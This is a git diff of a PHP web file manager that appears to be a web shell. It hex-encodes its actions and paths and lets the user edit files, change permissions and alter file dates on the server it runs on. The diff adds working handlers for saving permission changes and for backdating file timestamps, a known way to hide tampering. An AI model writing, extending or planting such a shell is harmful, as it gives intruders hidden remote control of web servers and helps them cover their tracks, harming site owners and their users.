@@ -52,19 +52,19 @@ function getFilePermission($file)
 }
 function editFile($file)
 {
-    ?>
+?>
     <form method="post" id="form_edit" onsubmit="eno(document.getElementById('content').value);">
         <div class="row">
             <h3>Edit File</h3>
-            <label>Filename : <?php echo $file;?></label>
-            <textarea class="u-full-width u-full-height" id='content' name="content"><?php echo htmlspecialchars(readFileContents($file));?></textarea>
+            <label>Filename : <?php echo $file; ?></label>
+            <textarea class="u-full-width u-full-height" id='content' name="content"><?php echo htmlspecialchars(readFileContents($file)); ?></textarea>
             <input class="button-primary" type="submit" name="submit" value="save">
-            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
-            <input type="hidden" name="actions" value="<?php echo bin2hex("save_file");?>">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("save_file"); ?>">
         </div>
     </form>
     <script>
-                function bin2hex(s) {
+        function bin2hex(s) {
             // utf8 to latin1
             var s = unescape(encodeURIComponent(s))
             var h = ''
@@ -73,47 +73,48 @@ function editFile($file)
             }
             return h
         }
+
         function eno(a) {
-		document.getElementById('content').value = bin2hex(a);
-        document.getElementById('form_edit').submit();
-	}
+            document.getElementById('content').value = bin2hex(a);
+            document.getElementById('form_edit').submit();
+        }
     </script>
-    <?php
+<?php
     exit;
 }
 function filePermission($file)
 {
     // Code
-    ?>
+?>
     <form method="post">
         <div class="row">
-            <h3>Change Mode</h3>
-            <label>Filename : <?php echo $file;?></label>
-            <input class="u-full-width" type="text" name="file" value="<?php echo getFilePermission($file) ?>">
+            <h3>Change Permission</h3>
+            <label>Filename : <?php echo $file; ?></label>
+            <input class="u-full-width" type="text" name="permission" value="<?php echo getFilePermission($file) ?>">
             <input class="button-primary" type="submit" name="submit" value="change">
-            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
-            <input type="hidden" name="actions" value="<?php echo bin2hex("chmod");?>">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("chmod_save"); ?>">
         </div>
     </form>
-    <?php
+<?php
     exit;
 }
 
 function fileChangedate($file)
 {
     // Code
-    ?>
+?>
     <form method="post">
         <div class="row">
             <h3>Change Date</h3>
             <label>Filename : <?php echo $file ?></label>
-            <input class="u-full-width" type="text" name="file" value="<?php echo fileDate($file) ?>">
+            <input class="u-full-width" type="text" name="date" value="<?php echo fileDate($file) ?>">
             <input class="button-primary" type="submit" name="submit" value="change">
-            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
-            <input type="hidden" name="actions" value="<?php echo bin2hex("touch");?>">
+            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
+            <input type="hidden" name="actions" value="<?php echo bin2hex("touch_save"); ?>">
         </div>
     </form>
-    <?php
+<?php
     exit;
 }
 
@@ -140,9 +141,9 @@ function getOwnership($filename)
 }
 function getFileColor($file)
 {
-    if(is_writable($file)) {
+    if (is_writable($file)) {
         return 'lime';
-    } elseif(is_readable($file)) {
+    } elseif (is_readable($file)) {
         return 'gray';
     } else {
         return 'red';
@@ -150,9 +151,12 @@ function getFileColor($file)
 }
 function fileDate($file)
 {
-    return date("D, d M Y H:i:s O", filemtime($file));
+    return @date("d-m-Y H:i:s", filemtime($file));
 }
-
+function changeFileDate($filename, $date)
+{
+    return @touch($filename, @strtotime($date));
+}
 function xorString($input, $key)
 {
     $textLen = strlen($input);
@@ -179,7 +183,7 @@ function readFileContents($file)
 }
 function writeFileContents($filename, $content)
 {
-    if(!is_writable($filename)) {
+    if (!is_writable($filename)) {
         return false; // not writable
     }
     if (function_exists('file_put_contents')) {
@@ -214,27 +218,48 @@ function writeFileContents($filename, $content)
     <link rel="stylesheet" href="https://raw.githubusercontent.com/dhg/Skeleton/gh-pages/dist/css/normalize.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css" integrity="sha512-EZLkOqwILORob+p0BXZc+Vm3RgJBOe1Iq/0fiI7r/wJgzOFZMlsqTa29UEl6v6U6gsV4uIpsNZoV32YZqrCRCQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <style>
-        a {color:black;}
-        a:link {text-decoration: none;}
-        a:visited {text-decoration: none;}
-        a:hover {text-decoration: none;}
-        a:active {text-decoration: none;}
+        a {
+            color: black;
+        }
+
+        a:link {
+            text-decoration: none;
+        }
+
+        a:visited {
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: none;
+        }
+
+        a:active {
+            text-decoration: none;
+        }
+
         .icon_folder {
             vertical-align: middle;
             width: 25px;
             height: 25px;
-            content:url('https://i.postimg.cc/W4WynX8V/folder-icon.png');
+            content: url('https://i.postimg.cc/W4WynX8V/folder-icon.png');
         }
+
         .icon_file {
             vertical-align: middle;
             width: 25px;
             height: 25px;
-            content:url('https://i.postimg.cc/T3THvZHG/Documents-icon.png');
+            content: url('https://i.postimg.cc/T3THvZHG/Documents-icon.png');
         }
-        textarea {resize: none;}
+
+        textarea {
+            resize: none;
+        }
+
         textarea.u-full-height {
             height: 50vh;
         }
+
         td.files {
             cursor: pointer;
         }
@@ -242,7 +267,7 @@ function writeFileContents($filename, $content)
 </head>
 
 <body>
-<?php
+    <?php
     if (isset($_POST['actions'])) {
         $actions = $_POST['actions'];
         $actions = hex2bin($actions);
@@ -257,16 +282,26 @@ function writeFileContents($filename, $content)
                 echo 'success';
                 break;
             case 'open_dir':
-            if (!isset($_POST['path'])) {
-                $_POST['path'] = bin2hex(getcwd());
-            }
-            chdir(hex2bin($_POST['path']));
-            break;
+                if (!isset($_POST['path'])) {
+                    $_POST['path'] = bin2hex(getcwd());
+                }
+                chdir(hex2bin($_POST['path']));
+                break;
             case 'chmod':
                 filePermission(hex2bin($_POST['path']));
                 break;
+            case 'chmod_save':
+                if (!@chmod(hex2bin($_POST['path']), octdec($_POST['permission']))) {
+                    echo 'failed';
+                }
+                break;
             case 'touch':
                 fileChangedate(hex2bin($_POST['path']));
+                break;
+            case 'touch_save':
+                if (!changeFileDate(hex2bin($_POST['path']), $_POST['date'])) {
+                    echo "failed";
+                }
                 break;
         }
     }
